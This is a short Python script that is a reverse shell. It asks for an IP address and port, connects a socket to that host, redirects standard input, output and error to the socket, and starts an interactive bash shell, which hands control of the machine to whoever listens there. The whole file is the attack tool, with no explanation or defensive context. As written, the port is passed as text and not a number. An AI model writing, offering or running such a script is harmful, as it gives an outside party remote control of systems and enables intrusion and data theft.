import subprocess
import socket
import os

host = input('Enter IP: ')
port = input('Enter Port: ')

sock = socket.socket()
sock.connect((host, port))

os.dup2(sock.fileno(),0)
os.dup2(sock.fileno(),1)
os.dup2(sock.fileno(),2)

subprocess.call(["bash", "-i"])